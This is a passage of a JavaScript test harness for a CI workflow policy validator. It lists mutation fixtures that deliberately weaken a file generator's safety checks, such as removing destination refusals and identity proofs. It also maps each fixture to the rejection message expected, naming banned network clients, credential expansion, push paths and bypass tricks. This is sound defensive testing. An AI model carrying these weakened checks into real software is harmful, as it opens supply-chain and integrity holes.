  ['T2-GENERATOR-FILE-003', 'unexpected destination refusal removed', 'generator', (source) => replaceOnce(source, "        throw 'unexpected-destination'\n", '')],
  ['T2-GENERATOR-FILE-004', 'link or reparse candidate identity proof removed', 'generator', (source) => replaceOnce(source, '        $strCandidateIdentity = Get-OrdinaryFileIdentity -LiteralPath $strCandidateFullPath\n', '')],
  ['T2-GENERATOR-FILE-005', 'candidate creation collision bound removed', 'generator', (source) => replaceOnce(source, "                    throw 'candidate-collision-limit'\n", '')],
  ['T2-GENERATOR-FILE-006', 'candidate durable flush removed', 'generator', (source) => replaceOnce(source, '            $objCandidateStream.Flush($true)\n', '')],
  ['T2-GENERATOR-FILE-007', 'publication failure path loses destination revalidation', 'generator', (source) => replaceOnce(source, "        $strPhase = 'revalidate-publication'\n", '')],
  ['T2-GENERATOR-FILE-008', 'post-publication uncertainty path loses verification', 'generator', (source) => replaceOnce(source, "        $strPhase = 'verify-publication'\n", '')],
  ['T2-GENERATOR-FILE-009', 'cleanup failure loses identity binding', 'generator', (source) => replaceOnce(source, 'if ((Get-OrdinaryFileIdentity -LiteralPath $strTemporaryPath) -cne $strCandidateIdentity)', 'if ((Get-OrdinaryFileIdentity -LiteralPath $strTemporaryPath) -ceq $strCandidateIdentity)')],
  ['T2-GENERATOR-FILE-010', 'multi-artifact partial success loses ordered records', 'generator', (source) => replaceOnce(source, '$listArtifactRecords.Add((New-ArtifactRecord', '$null = (New-ArtifactRecord')],
  ['T2-GENERATOR-FILE-011', 'BSD platform dispatch is disabled', 'generator', (source) => replaceOnce(source, '    if ($boolHostIsMacOS -or $boolHostIsFreeBsd) {', '    if ($boolHostIsLinux) {')],
  ['T2-GENERATOR-FILE-012', 'published destination loses candidate identity binding', 'generator', (source) => replaceOnce(source, '        if ($hashtableRecord.FinalOrdinaryIdentity -cne $strCandidateIdentity) {', '        if ($false) {')],
]);

// What each fixture must be rejected BY, not merely that it was rejected. A
// mutation that trips a broader check first -- a key-set assertion, a closing
// digest, the anchor rule ahead of the merge-key rule -- would otherwise be
// counted as coverage for an assertion that never ran. Every fixture must
// appear here; an unlisted one is a harness error rather than a silent pass.
const FIXTURE_EXPECTATIONS = Object.freeze({
  "T1-YAML-001": "yaml-syntax: T1-YAML-001 contains a parser error or warning",
  "T1-YAML-002": "yaml-syntax: T1-YAML-002 contains a directive",
  "T1-YAML-003": "yaml-syntax: anchors are prohibited",
  "T1-YAML-004": "yaml-syntax: anchors are prohibited",
  "T1-YAML-005": "yaml-syntax: merge keys are prohibited",
  "T1-YAML-006": "yaml-syntax: explicit or custom tags are prohibited",
  "T1-YAML-007": "yaml-syntax: T1-YAML-007 must contain exactly one document",
  "T1-YAML-008": "yaml-syntax: mapping keys must be unique strings",
  "T1-YAML-009": "yaml-syntax: non-finite numbers are prohibited",
  "T1-YAML-010": "yaml-syntax: anchors are prohibited",
  "T1-YAML-011": "yaml-syntax: explicit or custom tags are prohibited",
  "T1-YAML-012": "yaml-syntax: explicit or custom tags are prohibited",
  "T1-YAML-013": "yaml-syntax: anchors are prohibited",
  "T1-BUILD-001": "action-policy: build.publish.checkout uses the wrong action repository or SHA",
  "T1-BUILD-002": "action-policy: build.publish.checkout uses the wrong action repository or SHA",
  "T1-BUILD-003": "action-policy: build.publish.checkout uses the wrong action repository or SHA",
  "T1-BUILD-004": "policy: external action multiset differs from the locked policy",
  "T1-BUILD-005": "policy: build.publish step order differs from the locked policy",
  "T1-BUILD-006": "schema: build.publish.upload-generated has missing or extra keys",
  "T1-BUILD-007": "action-policy: build.publish.upload-generated uses the wrong action repository or SHA",
  "T1-BUILD-008": "policy: build.publish.checkout.with differs from the locked policy",
  "T1-BUILD-009": "policy: build.publish.checkout.with differs from the locked policy",
  "T1-BUILD-010": "policy: build.publish.checkout.with differs from the locked policy",
  "T1-BUILD-011": "policy: build workflow permissions differs from the locked policy",
  "T1-BUILD-012": "policy: build.verify permissions differs from the locked policy",
  "T1-BUILD-014": "schema: build jobs has missing or extra keys",
  "T1-BUILD-015": "schema: build jobs has missing or extra keys",
  "T1-BUILD-016": "schema: build.verify has missing or extra keys",
  "T1-BUILD-017": "schema: build.verify has missing or extra keys",
  "T1-BUILD-018": "schema: build.verify has missing or extra keys",
  "T1-BUILD-024": "schema: build.verify has missing or extra keys",
  "T1-BUILD-090": "schema: build.publish.upload-generated has missing or extra keys",
  "T1-BUILD-027": "policy: build.publish.upload-generated.with differs from the locked policy",
  "T1-BUILD-028": "policy: build.publish.upload-generated.with differs from the locked policy",
  "T1-BUILD-029": "policy: build.publish step order differs from the locked policy",
  "T1-BUILD-031": "policy: build.publish.checkout.with differs from the locked policy",
  "T1-BUILD-032": "policy: build triggers differs from the locked policy",
  "T1-BUILD-033": "policy: build triggers differs from the locked policy",
  "T1-BUILD-034": "action-policy: build.publish.checkout uses the wrong action repository or SHA",
  "T1-BUILD-035": "action-policy: build.publish.checkout uses the wrong action repository or SHA",
  "T1-BUILD-036": "credential-policy: build.verify.verify-checkout-credentials no longer asserts no local credential helper",
  "T1-BUILD-037": "credential-policy: build.verify.verify-checkout-credentials no longer asserts no persisted HTTP authorization",
  "T1-BUILD-038": "credential-policy: verify.generate-and-verify expands an unapproved credential",
  "T1-BUILD-040": "schema: build.verify.generate-and-verify has missing or extra keys",
  "T1-BUILD-041": "credential-policy: build.verify.verify-checkout-credentials no longer asserts native-command error mapping is disabled",
  "T1-BUILD-050": "git-policy: build.verify no longer drains both Git streams concurrently",
  "T1-BUILD-053": "git-policy: build.verify does not pin the Git executable before repository code runs",
  "T1-BUILD-054": "git-policy: build.verify does not pin the Git executable before repository code runs",
  "T1-BUILD-061": "git-policy: build.verify resolves Git through a shadowable command lookup",
  "T1-MARKDOWN-005": "markdown-policy: markdown.policy.validate is missing a required phase: ci --ignore-scripts --no-audit --no-fund",
  "T1-MARKDOWN-006": "markdown-policy: markdown.policy.validate is missing a required phase: ci --ignore-scripts --no-audit --no-fund",
  "T1-MARKDOWN-007": "markdown-policy: markdown.markdownlint.lint runs a required phase out of order: run lint:md\n",
  "T1-MARKDOWN-008": "markdown-policy: markdown.markdownlint.lint is missing a required phase: run lint:md:nested",
  "T1-MARKDOWN-009": "markdown-policy: markdown.policy.validate is missing a required phase: ./Validate-WorkflowPolicy.mjs ./build.yml ./markdownlint.yml",
  "T1-MARKDOWN-010": "schema: markdown.policy.validate has missing or extra keys",
  "T1-MARKDOWN-011": "markdown-policy: markdown.policy.validate is missing a required phase: E206CDB3562F0397E8EED7FB2C2586269A1F5335CDFF2906DA8D5E070426321E",
  "T1-MARKDOWN-012": "markdown-policy: markdown.policy.validate is missing a required phase: 277F7168AB3A4F1F7A2565DE13191D64B1572E7CB92B67B0972B3242BD4DE062",
  "T1-MARKDOWN-013": "markdown-policy: markdown.policy.validate is missing a required phase: if ($strPackageBefore -cne $strReviewedPackageHash -or $strLockBefore -cne $strReviewedLockHash)",
  "T1-BUILD-042": "credential-policy: verify.generate-and-verify expands an unapproved credential",
  "T1-MARKDOWN-015": "markdown-policy: markdown.policy.validate adds control flow that can bypass a required phase",
  "T1-MARKDOWN-016": "markdown-policy: markdown.policy.validate runs a required phase out of order: ./Validate-WorkflowPolicy.mjs ./build.yml ./markdownlint.yml",
  "T1-MARKDOWN-037": "markdown-policy: markdown.markdownlint.lint invokes the policy validator",
  "T1-MARKDOWN-038": "acquire-policy: markdown.policy.acquire adds a dynamic or indirect execution path",
  "T1-MARKDOWN-039": "acquire-policy: markdown.policy.acquire dot-sources something other than a reviewed literal command",
  "T1-MARKDOWN-040": "acquire-policy: markdown.policy.acquire adds a dynamic or indirect execution path",
  "T1-MARKDOWN-041": "markdown-policy: markdown.markdownlint.lint adds a process-termination path that can bypass a required phase",
  "T1-MARKDOWN-042": "markdown-policy: markdown.markdownlint.lint adds a process-termination path that can bypass a required phase",
  "T1-BUILD-130": "side-effect-policy: build.verify adds a process-termination path that can bypass a required probe",
  "T1-BUILD-131": "side-effect-policy: build.verify adds a process-termination path that can bypass a required probe",
  "T1-BUILD-132": "credential-policy: build.verify.verify-checkout-credentials adds control flow that can bypass a required assertion",
  "T1-BUILD-133": "acquire-policy: build.verify.acquire adds a dynamic or indirect execution path",
  "T1-GENERATOR-003": "supply-policy: the generator does not resolve Git through a module-qualified lookup",
  "T1-MARKDOWN-043": "markdown-policy: markdown.policy.validate is missing a required phase: $env:T1_EXPECTED_BUILD_DIGEST = (Get-FileHash -LiteralPath ./build.yml -Algorithm SHA256).Hash",
  "T1-MARKDOWN-044": "markdown-policy: markdown.policy.validate runs a required phase out of order: ci --ignore-scripts --no-audit --no-fund",
  "T1-MARKDOWN-045": "acquire-policy: markdown.policy.acquire references an executable script path",
  "T1-BUILD-134": "acquire-policy: build.verify.acquire references an executable script path",
  "T1-MARKDOWN-046": "acquire-policy: markdown.policy.acquire dot-sources something other than a reviewed literal command",
  "T1-MARKDOWN-047": "acquire-policy: markdown.policy.acquire invokes a native interpreter",
  "T1-BUILD-135": "acquire-policy: build.verify.acquire invokes a native interpreter",
  "T1-MARKDOWN-048": "acquire-policy: markdown.policy.acquire writes a runner step communication file",
  "T1-BUILD-136": "acquire-policy: build.verify.acquire writes a runner step communication file",
  // Reached the digest only because nothing semantic saw its tail; the client
  // ban now catches it earlier and more specifically. T1-MARKDOWN-055 still
  // covers the digest itself.
  "T1-MARKDOWN-054": "acquire-policy: markdown.policy.acquire adds a network client",
  "T1-MARKDOWN-055": "acquire-policy: markdown.policy.acquire adds a network client",
  "T1-MARKDOWN-050": "markdown-policy: markdown.policy.validate is missing a required phase: $env:npm_config_userconfig = '/dev/null'",
  "T1-MARKDOWN-051": "acquire-policy: markdown.policy.acquire invokes something other than a reviewed literal command",
  "T1-MARKDOWN-052": "acquire-policy: markdown.policy.acquire resolves an environment variable through a computed name",
  "T1-MARKDOWN-053": "acquire-policy: markdown.policy.acquire writes a file outside the reviewed native tools",
  "T1-MARKDOWN-049": "markdown-policy: markdown.policy.validate is missing a required phase: $env:npm_config_userconfig =",
  "T1-MARKDOWN-014": "markdown-policy: markdown.markdownlint.lint is missing a required phase: if (Test-Path Variable:PSNativeCommandUseErrorActionPreference) {",
  "T1-MARKDOWN-017": "markdown-policy: markdown.policy.validate captured phase status intPolicyExit is not assigned exactly once",
  "T1-DEPENDABOT-001": "policy: Dependabot configuration differs from the locked policy",
  "T1-DEPENDABOT-002": "policy: Dependabot configuration differs from the locked policy",
  "T1-DEPENDABOT-003": "policy: Dependabot configuration differs from the locked policy",
  "T1-MARKDOWN-018": "markdown-policy: markdown.policy.validate is missing a required phase: @('.npmrc', '../.npmrc', '../../.npmrc')",
  "T1-MARKDOWN-019": "markdown-policy: markdown.policy.validate runs a required phase out of order: $env:T1_EXPECTED_BUILD_DIGEST = (Get-FileHash -LiteralPath ./build.yml -Algorithm SHA256).Hash",
  // Moved onto the command allowlist: its payload calls Add-Content, which is
  // not a reviewed generator command. T1-GENERATOR-026 replaces the digest
  // coverage this vacated -- a comment-only edit, which the projection blanks,
  // so no named rule can see it and only the digest can.
  "T1-GENERATOR-001": "supply-policy: the generator runs an unreviewed command: Add-Content",
  "T1-GENERATOR-026": "supply-policy: the generator does not terminate immediately after the reviewed result",
  // Round 53. The first three report through the invocation count rather than
  // naming the alias, which is the point: the count does not know what `sv` is
  // and does not need to. -032 reports through the depth half of the same rule.
  "T1-GENERATOR-027": "supply-policy: the generator does not invoke through the call operator exactly where it was reviewed to",
  "T1-GENERATOR-028": "supply-policy: the generator does not invoke through the call operator exactly where it was reviewed to",
  "T1-GENERATOR-029": "supply-policy: the generator uses the dot-source invocation operator",
  "T1-GENERATOR-030": "supply-policy: the generator does not assign its Git path exactly once",
  "T1-GENERATOR-031": "supply-policy: the generator does not assign its Git path exactly once",
  "T1-GENERATOR-032": "supply-policy: a reviewed invocation is no longer reachable where it was reviewed: $arrOutput = @(& $strGitPath -C $RepositoryRoot ls-files --error-unmatch -- $RepositoryPath 2>$null)",
  "T1-MARKDOWN-091": "markdown-policy: markdown.policy.validate writes an unreviewed qualified variable: local:intPolicyExit",
  "T1-MARKDOWN-092": "markdown-policy: markdown.policy.validate captured phase status intPolicyExit is not assigned exactly once",
  "T1-MARKDOWN-093": "markdown-policy: markdown.markdownlint.lint writes an unreviewed qualified variable: private:intOuterExit",
  "T1-BUILD-145": "side-effect-policy: build.verify does not assign $strControlSurfaceBefore exactly once",
  "T1-BUILD-146": "side-effect-policy: build.verify does not assign $objWorktreeBefore exactly once",
  "T1-BUILD-147": "side-effect-policy: build.verify does not assign $listChanged exactly once",
  "T1-BUILD-148": "side-effect-policy: build.verify does not assign $strControlSurfaceBefore exactly once",
  "T1-BUILD-149": "side-effect-policy: build.verify makes an unreviewed use of $objWorktreeBefore: .Clear",
  "T1-BUILD-150": "side-effect-policy: build.verify does not invoke exactly where it was reviewed to",
  "T1-BUILD-151": "side-effect-policy: build.verify runs an unreviewed command: sv",
  // Reported by the command allowlist rather than the ban: Set-Item is a
  // command-position token, so the positive rule sees it first. The ban still
  // earns its place -- it reaches the Variable: provider and the PSVariable API
  // reached without a command name, which the allowlist cannot see.
  "T1-BUILD-152": "side-effect-policy: build.verify runs an unreviewed command: Set-Item",
  "T1-BUILD-153": "side-effect-policy: build.verify uses New-Variable outside its reviewed constant bindings",
  "T1-BUILD-154": "side-effect-policy: build.verify makes an unreviewed use of $listChanged: .Clear",
  "T1-BUILD-155": "side-effect-policy: build.verify refers to $objWorktreeBefore 5 times rather than the reviewed 4",
  "T1-BUILD-156": "side-effect-policy: build.verify makes an unreviewed static call: System.Diagnostics.Process::Start",
  "T1-GENERATOR-034": "supply-policy: the generator does not assign its Git path exactly once",
  "T1-GENERATOR-035": "supply-policy: the generator does not terminate immediately after the reviewed result",
  "T1-MARKDOWN-094": "markdown-policy: markdown.policy.validate captured phase status intPolicyExit is not assigned exactly once",
  "T1-MARKDOWN-095": "markdown-policy: markdown.policy.validate captured phase status intPolicyExit is not assigned exactly once",
  "T1-GENERATOR-033": "supply-policy: the generator does not assign its Git path exactly once",
  // Truncation removes the dispatch, so this now reports the specific missing
  // structure rather than "the bytes moved". T1-GENERATOR-001 still covers the
  // digest message: it appends a function and trips nothing else.
  "T1-GENERATOR-002": "supply-policy: the generator can terminate before the reviewed result",
  "T1-GENERATOR-013": "supply-policy: the generator writes a variable through an indirect API",
  "T1-GENERATOR-014": "supply-policy: the generator returns at the top level",
  "T1-GENERATOR-015": "supply-policy: the generator does not preserve the reviewed tracked-destination authority assertion count",
  "T1-GENERATOR-016": "supply-policy: the generator can reach its Git lookup only after unreviewed statements",
  "T1-GENERATOR-017": "supply-policy: the generator does not preserve the reviewed native Git status and exact path check assertion count",
  "T1-GENERATOR-018": "supply-policy: the generator does not preserve the reviewed candidate byte verification assertion count",
  "T1-GENERATOR-019": "supply-policy: the generator does not preserve the reviewed existing-destination publication assertion count",
  "T1-BUILD-140": "side-effect-policy: build.verify no longer performs a reviewed drift guard: if ($arrOutside.Count -ne 0) {",
  "T1-BUILD-141": "side-effect-policy: build.verify no longer performs a reviewed drift guard: $arrArtifacts -cnotcontains $_",
  "T1-BUILD-142": "side-effect-policy: build.verify no longer performs a reviewed drift guard: Sort-Object -CaseSensitive",
  "T1-BUILD-143": "side-effect-policy: build.verify no longer performs a reviewed drift guard: if ($objDiff.ExitCode -ne 0 -and $objDiff.ExitCode -ne 1) {",
  "T1-GENERATOR-020": "supply-policy: the generator does not preserve the reviewed complete payload map assertion count",
  "T1-GENERATOR-021": "supply-policy: the generator does not preserve the reviewed failed pre-publication result assertion count",
  "T1-GENERATOR-022": "supply-policy: the generator can terminate before the reviewed result",
  "T1-GENERATOR-023": "supply-policy: the generator does not preserve the reviewed transaction order: $strResultPhase = 'replace-artifacts'",
  "T1-GENERATOR-024": "supply-policy: the generator no longer writes a reviewed qualified variable: script:strGeneratorResultSchema",
  "T1-GENERATOR-025": "supply-policy: the generator does not preserve the reviewed candidate cleanup deletion assertion count",
  "T1-BUILD-144": "side-effect-policy: a reviewed drift guard is no longer reachable where it was reviewed: if ($arrOutside.Count -ne 0) {",
  "T1-MARKDOWN-090": "markdown-policy: markdown.markdownlint.lint supply gate is no longer reachable where it was reviewed: if ($strLintConfigHash -cne $strReviewedLintConfigHash -or $strLintHelperHash -cne $strReviewedLintHelperHash) {",
  "T1-MARKDOWN-020": "markdown-policy: markdown.markdownlint.lint is missing a required phase: supply: lint configuration or helper does not match the reviewed digest",
  "T1-BUILD-086": "isolation-policy: build.verify.upload-generated uses an action",
  "T1-BUILD-087": "policy: build.publish step order differs from the locked policy",
  "T1-BUILD-088": "schema: build.publish has missing or extra keys",
  "T1-BUILD-089": "policy: build.verify step order differs from the locked policy",
  "T1-BUILD-097": "credential-policy: verify.generate-and-verify expands an unapproved credential",
  "T1-BUILD-098": "credential-policy: verify.generate-and-verify expands an unapproved credential",
  "T1-BUILD-100": "credential-policy: verify.generate-and-verify contains a workflow expression",
  "T1-BUILD-101": "side-effect-policy: build.verify returns from the script at top level",
  "T1-BUILD-122": "side-effect-policy: build.verify returns from the script at top level",
  "T1-BUILD-123": "side-effect-policy: build.verify returns from the script at top level",
  "T1-BUILD-124": "side-effect-policy: verify.generate-and-verify contains a character outside printable ASCII",
  "T1-BUILD-125": "acquire-policy: build.verify.acquire adds control flow that can bypass a required assertion",
  "T1-BUILD-126": "acquire-policy: build.verify.acquire does not end at the verified extraction",
  "T1-BUILD-127": "side-effect-policy: verify.generate-and-verify uses the stop-parsing token",
  "T1-BUILD-104": "side-effect-policy: the generator is not invoked exactly once as a statement",
  "T1-BUILD-106": "side-effect-policy: verify.generate-and-verify uses a here-string or block comment",
  "T1-BUILD-105": "side-effect-policy: build.verify can suppress a probe failure after the generator runs",
  "T1-BUILD-102": "credential-policy: build.verify.verify-checkout-credentials no longer asserts exactly one origin URL",
  "T1-BUILD-103": "credential-policy: build.verify.verify-checkout-credentials no longer asserts a credential-free GitHub HTTPS origin",
  "T1-BUILD-099": "credential-policy: build.verify.verify-checkout-credentials adds control flow that can bypass a required assertion",
  "T1-BUILD-094": "side-effect-policy: build.verify worktree walk lost its FIFO guard or its exact .git exclusion",
  "T1-BUILD-095": "side-effect-policy: build.verify worktree walk lost its FIFO guard or its exact .git exclusion",
  "T1-BUILD-096": "policy: build.verify permissions differs from the locked policy",
  "T1-BUILD-091": "side-effect-policy: build.verify worktree walk can follow a link or read a file whole",
  "T1-BUILD-092": "side-effect-policy: build.verify worktree walk can follow a link or read a file whole",
  "T1-BUILD-093": "side-effect-policy: build.verify worktree walk can follow a link or read a file whole",
  "T1-BUILD-084": "side-effect-policy: build.verify does not bracket the generator with a worktree byte comparison",
  "T1-BUILD-085": "side-effect-policy: build.verify does not bracket the generator with a worktree byte comparison",
  "T1-BUILD-083": "git-policy: the Git control-surface digest does not frame its components unambiguously",
  "T1-BUILD-082": "side-effect-policy: build.verify does not assert the runner step communication files are empty",
  "T1-BUILD-081": "git-policy: build.verify probes inherit system or global Git configuration",
  "T1-BUILD-080": "side-effect-policy: build.verify tolerates generated-artifact drift",
  "T1-BUILD-078": "git-policy: build.verify does not bracket the generator with a Git control-surface digest",
  "T1-BUILD-079": "side-effect-policy: build.verify adds control flow that can bypass a required probe",
  "T1-BUILD-073": "side-effect-policy: the generator is not invoked exactly once as a statement",
  "T1-BUILD-074": "git-policy: build.verify does not pin the Git executable before repository code runs",
  "T1-BUILD-075": "git-policy: build.verify does not pin the Git executable before repository code runs",
  "T1-BUILD-076": "side-effect-policy: verify.generate-and-verify adds a push path to a read-only workflow",
  "T1-BUILD-077": "side-effect-policy: verify.generate-and-verify adds a repository mutation to a read-only workflow",
  // Was the governed-step digest's only fixture until round 45. The command
  // allowlist added then reaches Set-Variable directly, so this now reports the
  // specific rule rather than "the bytes moved"; T1-MARKDOWN-076 replaces the
  // digest coverage this vacated.
  "T1-MARKDOWN-021": "markdown-policy: markdown.markdownlint.lint runs an unreviewed bare command: Set-Variable",
  "T1-MARKDOWN-076": "markdown-policy: markdown.markdownlint.lint does not match its reviewed digest",
  "T1-MARKDOWN-077": "markdown-policy: markdown.policy.validate runs an unreviewed bare command: npm",
  "T1-MARKDOWN-078": "markdown-policy: markdown.markdownlint.lint runs an unreviewed bare command: tools/prepare.ps1",
  "T1-MARKDOWN-079": "markdown-policy: markdown.policy.validate assigns an unreviewed environment variable: NODE_OPTIONS",
  "T1-MARKDOWN-080": "markdown-policy: markdown.markdownlint.lint assigns an unreviewed environment variable: NODE_OPTIONS",
  "T1-MARKDOWN-081": "markdown-policy: markdown.policy.validate resolves an environment variable through a computed name",
  // The two jobs' lists differ by exactly the digest baselines, and this proves
  // the difference is enforced per job rather than pooled: a name the policy
  // step may legitimately assign is refused in the lint step.
  "T1-MARKDOWN-082": "markdown-policy: markdown.markdownlint.lint assigns an unreviewed environment variable: T1_EXPECTED_BUILD_DIGEST",
  "T1-MARKDOWN-083": "markdown-policy: markdown.policy.validate assigns an unreviewed environment variable: NODE_OPTIONS",
  "T1-MARKDOWN-084": "markdown-policy: markdown.markdownlint.lint assigns an unreviewed environment variable: NODE_OPTIONS",
  "T1-MARKDOWN-085": "markdown-policy: markdown.policy.validate adds a dynamic or indirect execution path",
  "T1-MARKDOWN-086": "markdown-policy: markdown.markdownlint.lint adds a dynamic or indirect execution path",
  "T1-MARKDOWN-087": "acquire-policy: markdown.policy.acquire references an executable script path",
  "T1-MARKDOWN-088": "acquire-policy: markdown.policy.acquire references an executable script path",
  "T1-MARKDOWN-089": "acquire-policy: markdown.policy.acquire references an executable script path",
  "T1-GENERATOR-010": "supply-policy: the generator contains a character outside printable ASCII",
  "T1-GENERATOR-011": "supply-policy: the generator does not preserve the reviewed Git executable binding assertion count",
  "T1-GENERATOR-012": "supply-policy: the generator does not assign its Git path exactly once",
  "T1-MARKDOWN-023": "markdown-policy: markdown.markdownlint.lint contains a workflow expression",
  "T1-MARKDOWN-022": "policy: markdown.markdownlint job permissions differs from the locked policy",
  "T1-LINTASSET-001": "supply-policy: .markdownlint.jsonc does not match its reviewed digest",
  "T1-LINTASSET-002": "supply-policy: lint-nested-markdown.js does not match its reviewed digest",
  "T1-NPMRC-001": "supply-policy: repository-controlled npm configuration is present: .github/workflows/.npmrc",
  "T1-NPMRC-002": "supply-policy: repository-controlled npm configuration is present: .npmrc",
  "T1-VERSION-001": "invalid-version: exactly one marker must occur in script help before the first function",
  "T1-VERSION-002": "invalid-version: exactly one marker must occur in script help before the first function",
  "T1-VERSION-003": "invalid-version: exactly one marker must occur in script help before the first function",
  "T1-VERSION-004": "invalid-version: a component has a leading zero",
  "T1-VERSION-005": "invalid-version: a component is out of range",
  "T1-VERSION-006": "invalid-version: build is not a real Gregorian date",
  "T1-VERSION-007": "unexpected-version: valid generator version does not match the trusted reviewed version",
  "T1-TEXT-001": "text-policy: T1-TEXT-001 is not well-formed UTF-8",
  "T1-TEXT-002": "text-policy: T1-TEXT-002 is not well-formed UTF-8",
  "T1-TEXT-003": "text-policy: T1-TEXT-003 is not well-formed UTF-8",
  "T1-TEXT-004": "text-policy: T1-TEXT-004 is not well-formed UTF-8",
  "T1-TEXT-005": "text-policy: T1-TEXT-005 has a UTF-8 BOM",
  "T1-TEXT-006": "text-policy: T1-TEXT-006 contains a carriage return",
  "T1-PACKAGE-001": "policy: package.json scripts differs from the locked policy",
  "T1-PACKAGE-002": "policy: package.json devDependencies differs from the locked policy",
  "T1-PACKAGE-003": "policy: package.json scripts differs from the locked policy",
  "T1-PACKAGE-004": "supply-policy: package.json does not match its reviewed digest",
  "T1-BUILD-107": "policy: build.verify step order differs from the locked policy",
  "T1-BUILD-108": "side-effect-policy: the generator invocation is nested inside a block",
  "T1-BUILD-109": "side-effect-policy: verify.generate-and-verify registers a script-wide error trap",
  "T1-BUILD-110": "acquire-policy: build.verify.acquire no longer asserts native-command error mapping is disabled",
  "T1-BUILD-111": "acquire-policy: build.verify.acquire no longer asserts the server the runner named",
  "T1-BUILD-112": "acquire-policy: build.verify.acquire no longer asserts a plain owner/name repository",
  "T1-BUILD-113": "acquire-policy: build.verify.acquire no longer asserts a full commit hash rather than a ref",
  "T1-BUILD-114": "acquire-policy: build.verify.acquire no longer asserts an empty workspace before fetching",
  "T1-BUILD-115": "acquire-policy: build.verify.acquire no longer asserts a fetch of the commit itself",
  "T1-BUILD-116": "acquire-policy: build.verify.acquire no longer asserts that the checked out revision is the triggering revision",
  "T1-BUILD-117": "acquire-policy: build.verify.acquire introduces a credential into an anonymous fetch",
  "T1-BUILD-118": "acquire-policy: build.verify.acquire native-status classification count changed",
  "T1-BUILD-119": "acquire-policy: build.verify.acquire adds control flow that can bypass a required assertion",
  "T1-BUILD-120": "acquire-policy: build.verify.acquire script does not match its reviewed digest",
  "T1-MARKDOWN-024": "markdown-policy: markdown.markdownlint.lint can suppress a phase failure",
  "T1-MARKDOWN-025": "markdown-policy: markdown.markdownlint.lint can suppress a phase failure",
  "T1-MARKDOWN-026": "isolation-policy: markdown.markdownlint.setup-node uses an action",
  "T1-MARKDOWN-027": "acquire-policy: markdown.policy.acquire no longer asserts the exact reviewed Node archive",
  "T1-MARKDOWN-028": "acquire-policy: markdown.policy.acquire no longer asserts the reviewed Node archive digest",
  "T1-MARKDOWN-029": "acquire-policy: markdown.policy.acquire no longer asserts the download, its verification, and the extraction as one uninterrupted block",
  "T1-MARKDOWN-030": "markdown-policy: markdown.markdownlint.lint adds a network client",
  "T1-MARKDOWN-031": "acquire-policy: markdown.policy.acquire script does not match its reviewed digest",
  "T1-MARKDOWN-032": "acquire-policy: markdown.policy.acquire network request count changed",
  "T1-MARKDOWN-033": "acquire-policy: markdown.policy.acquire does not end at the verified extraction",
  "T1-MARKDOWN-034": "acquire-policy: markdown.policy.acquire invokes something other than a reviewed literal command",
  "T1-MARKDOWN-035": "acquire-policy: markdown.policy.acquire invokes something other than a reviewed literal command",
  "T1-MARKDOWN-036": "markdown-policy: markdown.markdownlint.lint is missing a required phase: supply: lint configuration or helper changed during installation",
  "T1-PACKAGE-005": "supply-policy: resolved yaml parser integrity is not the reviewed value",
  "T1-PACKAGE-006": "policy: lockfile root devDependencies differs from the locked policy",
  "T1-GENERATOR-004": "supply-policy: the generator resolves a command through a shadowable lookup",
  "T1-MARKDOWN-056": "markdown-policy: markdown.markdownlint.lint adds a network client",
  "T1-MARKDOWN-057": "acquire-policy: markdown.policy.acquire adds a network client",
  "T1-MARKDOWN-058": "acquire-policy: markdown.policy.acquire constructs an object through New-Object",
  "T1-MARKDOWN-059": "acquire-policy: markdown.policy.acquire calls an unreviewed static member: System.IO.File::Copy",
  "T1-BUILD-157": "side-effect-policy: build.verify runs an unreviewed command: pwsh",
  "T1-BUILD-158": "side-effect-policy: build.verify runs an unreviewed command: pwsh",
  "T1-BUILD-159": "side-effect-policy: build.verify reaches a static member other than by naming a literal type and a literal member: d = ' ' [System.Diagnostics.Process]::$strMethod('",
  "T1-BUILD-160": "side-effect-policy: build.verify uses the type [System.Diagnostics.Process] as a value rather than as a static call or a cast",
  "T1-BUILD-161": "acquire-policy: build.verify.acquire uses the type [System.IO.File] as a value rather than as a static call or a cast",
  "T1-GENERATOR-036": "supply-policy: the generator uses the type [System.IO.File] as a value rather than as a static call or a cast",
  "T1-MARKDOWN-096": "markdown-policy: markdown.policy.validate uses the type [System.IO.File] as a value rather than as a static call or a cast",
  "T1-BUILD-162": "side-effect-policy: build.verify uses the type [System.Diagnostics.Process] as a value rather than as a static call or a cast",
  "T1-GENERATOR-037": "supply-policy: the generator reaches a member through reflection",
  "T1-MARKDOWN-060": "acquire-policy: markdown.policy.acquire reaches a static member other than by naming a literal type and a literal member: [System.IO.File]::$strMethod('",
  "T1-MARKDOWN-065": "acquire-policy: markdown.policy.acquire invokes an unreviewed cmdlet: Copy-Item",
  "T1-BUILD-137": "credential-policy: build.verify.verify-checkout-credentials adds control flow that can bypass a required assertion",
  "T1-MARKDOWN-061": "acquire-policy: markdown.policy.acquire does not bind $strCurlPath exactly once as a reviewed constant",
  "T1-MARKDOWN-062": "acquire-policy: markdown.policy.acquire does not resolve $strResolvedCurl from its reviewed absolute paths",
  "T1-MARKDOWN-063": "acquire-policy: markdown.policy.acquire names strCurlPath outside its reviewed constant binding",
  "T1-MARKDOWN-064": "acquire-policy: markdown.policy.acquire assigns $strCurlPath outside its reviewed constant binding",
  "T1-MARKDOWN-066": "schema: Markdown jobs has missing or extra keys",
  "T1-MARKDOWN-067": "schema: Markdown jobs has missing or extra keys",
  "T1-MARKDOWN-068": "schema: markdown.markdownlint has missing or extra keys",
  "T1-MARKDOWN-069": "markdown-policy: markdown.policy.validate runs a lint phase",
  "T1-MARKDOWN-070": "policy: markdown.markdownlint step order differs from the locked policy",
  "T1-MARKDOWN-071": "markdown-policy: the two governed steps do not share one byte-identical supply prelude",
  "T1-MARKDOWN-072": "markdown-policy: markdown.policy.validate does not close its supply prelude exactly once",
  "T1-MARKDOWN-073": "markdown-policy: markdown.markdownlint.lint makes an unreviewed invocation: & $strNodePath $strValidatorPath ./build.yml ./markdownlint.yml",
  "T1-MARKDOWN-074": "markdown-policy: markdown.policy.validate makes an unreviewed invocation: & $strNpmPath run ('lint:' + 'md')",
  "T1-MARKDOWN-075": "markdown-policy: markdown.policy.validate repeats a reviewed invocation: & $strNpmPath ci --ignore-scripts --no-audit --no-fund",
  "T1-PARSER-001": "supply-policy: the installed YAML parser does not match its reviewed bytes",
  "T1-PARSER-002": "supply-policy: the YAML parser tree contains a non-ordinary entry: dist",
  "T1-GENERATOR-038": "supply-policy: the generator helper Get-ScriptVersionRecord does not contain complete single-line comment-based help",
  "T1-GENERATOR-039": "supply-policy: the generator does not preserve the reviewed post-publication uncertainty assertion count",
